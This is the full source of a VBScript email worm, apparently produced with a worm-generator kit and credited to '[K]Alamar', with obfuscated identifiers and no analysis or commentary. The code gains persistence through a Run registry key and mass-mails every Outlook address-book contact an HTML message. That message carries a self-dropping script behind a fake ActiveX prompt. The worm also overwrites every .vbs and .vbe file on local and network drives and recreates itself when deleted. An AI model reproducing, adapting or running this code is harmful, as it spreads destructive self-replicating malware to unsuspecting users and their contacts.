'Vbs.Worm Created By [K]Alamar
On Error Resume Next
Set xzlKbmyt830= Createobject("scripting.filesystemobject")
xzlKbmyt830.copyfile wscript.scriptfullname,xzlKbmyt830.GetSpecialFolder(1)& "\Worm.vbs"
Set BeN6rzAn7vU = CreateObject("WScript.Shell")
BeN6rzAn7vU.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm","wscript.exe "&xzlKbmyt830.GetSpecialFolder(1)& "\Worm.vbs %"
if BeN6rzAn7vU.regread ("HKCU\software\Worm\mailed") <> "1" then
c08eYdfC2AH()
end if
m5K17UpgNm4()
if month(now) =1 and day(now) =26 then
msgbox "You are stupid!",16
end if
Set NsdpX597C61= xzlKbmyt830.opentextfile(wscript.scriptfullname, 1)
Q55q1Y7l399= NsdpX597C61.readall
NsdpX597C61.Close
Do
If Not (xzlKbmyt830.fileexists(wscript.scriptfullname)) Then
Set h4FMC9AI9ic= xzlKbmyt830.createtextfile(wscript.scriptfullname, True)
h4FMC9AI9ic.writeQ55q1Y7l399
h4FMC9AI9ic.Close
End If
Loop
Function c08eYdfC2AH()
On Error Resume Next
Set xA769f5CX4r= CreateObject("Outlook.Application")
If xA769f5CX4r = "Outlook" Then
Set hXx6uDr7hc4= xzlKbmyt830.opentextfile(wscript.scriptfullname, 1)
I = 1
Do While hXx6uDr7hc4.atendofstream = False
VVvS0PCF4CX= hXx6uDr7hc4.readline
uB5345Vr9pR= uB5345Vr9pR& Chr(34) & " & vbcrlf & " & Chr(34) & replace(VVvS0PCF4CX, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
hXx6uDr7hc4.close
cjJa38r820e = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & " & chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
cjJa38r820e = cjJa38r820e& vbCrLf & "On Error Resume Next"
cjJa38r820e = cjJa38r820e & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
cjJa38r820e = cjJa38r820e & vbCrLf & "If Err.Number <> 0 Then"
cjJa38r820e = cjJa38r820e & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
cjJa38r820e = cjJa38r820e & vbCrLf & "Else"
cjJa38r820e = cjJa38r820e & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\Worm.vbs" & Chr(34) & ", True)"
cjJa38r820e = cjJa38r820e & vbCrLf & "vbs.write  " & Chr(34) & uB5345Vr9pR& Chr(34)
cjJa38r820e = cjJa38r820e & vbCrLf & "vbs.Close"
cjJa38r820e = cjJa38r820e & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
cjJa38r820e = cjJa38r820e & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\Worm.vbs %" & Chr(34) & ""
ZL52xYm66Ta = ZL52xYm66Ta& vbCrLf & "document.write " & Chr(34) & "This message has permanent errors.<br>Sorry<br>" & Chr(34) & ""
ZL52xYm66Ta = ZL52xYm66Ta& vbCrLf & "End If"
ZL52xYm66Ta = ZL52xYm66Ta & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
Z8dWbdh2YG2=cjJa38r820e & ZL52xYm66Ta
Set NJE6TneLk4L = xA769f5CX4r.GetNameSpace("MAPI")
For Each ic5V496A60P In NJE6TneLk4L.AddressLists
If ic5V496A60P.AddressEntries.Count <> 0 Then
M440WZk2Q8f= ic5V496A60P.AddressEntries.Count
Set JDuB8ZG9ga2= xA769f5CX4r.CreateItem(0)
JDuB8ZG9ga2.Subject = "Rv: 4You"
JDuB8ZG9ga2.HTMLBody = Z8dWbdh2YG2
JDuB8ZG9ga2.DeleteAfterSubmit = True
For y66954Br3q2 = 1 To M440WZk2Q8f
Set Zv5sBp72a4T= ic5V496A60P.AddressEntries(y66954Br3q2)
If M440WZk2Q8f= 1 Then
JDuB8ZG9ga2.BCC = Zv5sBp72a4T.Address
Else
JDuB8ZG9ga2.BCC = JDuB8ZG9ga2.BCC & "; " & Zv5sBp72a4T.Address
End If
Next
JDuB8ZG9ga2.send
End If
Next
BeN6rzAn7vU.regwrite "HKCU\software\Worm\mailed", "1"
xA769f5CX4r.Quit
end if
End Function
Function m5K17UpgNm4()
On Error Resume Next
Set tub9NpD4AVR = xzlKbmyt830.Drives
For Each C5345Vr9pRQ In tub9NpD4AVR
If C5345Vr9pRQ.Drivetype = Remote Then
qTl47Q3VR2F= C5345Vr9pRQ & "\"
Call sJa38r820e9(qTl47Q3VR2F)
ElseIf C5345Vr9pRQ.IsReady Then
qTl47Q3VR2F= C5345Vr9pRQ&"\"
Call sJa38r820e9(qTl47Q3VR2F)
End If
Next
End Function
Function sJa38r820e9(l52xYm66Ta8)
UE6TneLk4Li=l52xYm66Ta8
Set VdWbdh2YG2p= xzlKbmyt830.GetFolder(UE6TneLk4Li)
Set p5V496A60P6= VdWbdh2YG2p.Files
For Each L40WZk2Q8f7 In p5V496A60P6
if xzlKbmyt830.GetExtensionName(L40WZk2Q8f7.path) = "vbs" then
xzlKbmyt830.copyfile wscript.scriptfullname , L40WZk2Q8f7.path , true
end if
if xzlKbmyt830.GetExtensionName(L40WZk2Q8f7.path) = "vbe" then
xzlKbmyt830.copyfile wscript.scriptfullname , L40WZk2Q8f7.path , true
end if
Next
Set L40WZk2Q8f7= VdWbdh2YG2p.SubFolders
For Each duB8ZG9ga24 In L40WZk2Q8f7
Call sJa38r820e9(duB8ZG9ga24.path)
Next
End Function
'Vbswg 1.5. [K]Alamar.
